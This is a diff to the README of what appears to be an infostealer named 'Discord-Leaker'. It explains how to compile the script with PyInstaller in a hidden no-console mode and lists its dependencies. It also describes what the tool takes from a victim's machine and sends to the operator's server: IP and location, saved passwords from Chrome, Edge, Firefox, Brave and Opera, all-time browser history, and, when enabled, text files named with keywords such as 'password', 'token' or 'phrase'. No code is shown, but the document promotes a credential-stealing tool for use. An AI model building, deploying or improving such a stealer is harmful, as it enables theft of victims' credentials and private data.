@@ -19,8 +19,27 @@ drag and drop the py file into "pyinstaller.exe" and it will give options "--noc
 
 or run the command : 
 pyinstaller --clean --onefile --noconsole -i NONE {script} (hidden)
+
 pyinstaller --clean --onefile -i NONE (shown)
 
 # Dependencies
 
 pip install requests pywin32 pycryptodome
+
+# Usage
+When run on the host's computer, it will dump info into the server where it's located
+
+the info being the following :
+
+IP & LOCATION
+
+Passwords from popular browsers (chrome, edge, firefox, brave, opera, opera gx)
+
+- ONLY IF ENABLED WILL SEARCH FOR TEXT FILES WITH THE FOLOWING LABELS : "password", "pw", "apple", "important", "secret", "key", "login", "account", "credentials", "access", "private", "confidential", "secure", "code", "token", "phrase", "pin","credentials", "auth", "key", "secret"
+
+Browser history (all time)
+
+# Note
+to enable the text file search go to this point in the code and un-note it :
+
+![screenshot](https://github.com/UnafeDev/Discord-Leaker/blob/main/image2.png)
